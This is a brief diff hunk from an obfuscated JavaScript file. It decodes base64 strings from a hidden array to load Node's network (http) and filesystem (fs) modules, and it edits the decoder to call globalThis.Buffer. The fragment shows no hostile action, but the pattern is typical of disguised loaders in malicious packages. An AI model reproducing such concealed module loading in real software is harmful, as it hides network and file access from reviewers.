@@ -53,7 +53,7 @@ const _0xS = [
 ];
 
 const _0xD = _0xN =>
-  Buffer.from(_0xS[_0xN], "base64").toString("utf8");
+  globalThis.Buffer.from(_0xS[_0xN], "base64").toString("utf8");
 
 const http = require(_0xD(0));
 const fs = require(_0xD(1));
